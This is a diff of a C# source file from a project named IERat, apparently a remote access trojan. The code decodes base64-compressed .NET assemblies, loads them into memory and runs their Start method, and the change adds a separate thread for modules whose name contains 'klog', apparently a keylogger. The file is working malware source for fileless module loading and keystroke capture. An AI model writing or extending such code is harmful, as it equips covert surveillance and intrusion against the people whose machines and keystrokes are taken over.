@@ -1,13 +1,12 @@
 ﻿using System;
 using System.Reflection;
 using System.Threading;
-using System.Threading.Tasks;
 
 namespace IERat.lib
 {
     class Modules
     {
-        public static Thread LoadModule(string ModuleData)
+        public static object LoadModule(string ModuleData)
         {
             Assembly assembly = Assembly.Load(Utils.Decompress(Convert.FromBase64String(ModuleData)));
             var TypesEnumerator = assembly.ExportedTypes.GetEnumerator();
@@ -15,10 +14,16 @@ namespace IERat.lib
             var Type = TypesEnumerator.Current;
             //var ClassInstance = Activator.CreateInstance(Type);
             var Start = Type.GetMethod("Start");
-            Thread ModuleThreadTest = new Thread(() => StartMethod(Start));
-            return ModuleThreadTest;
+            if (Type.Name.Contains("klog"))
+            {
+                Thread ModuleThreadTest = new Thread(() => StartMethod(Start));
+                return ModuleThreadTest;
+            }
+            else
+            {
+                return Start;
+            }
         }
-
         public static void StartMethod(MethodInfo methodInfo)
         {
             methodInfo.Invoke(null, null);
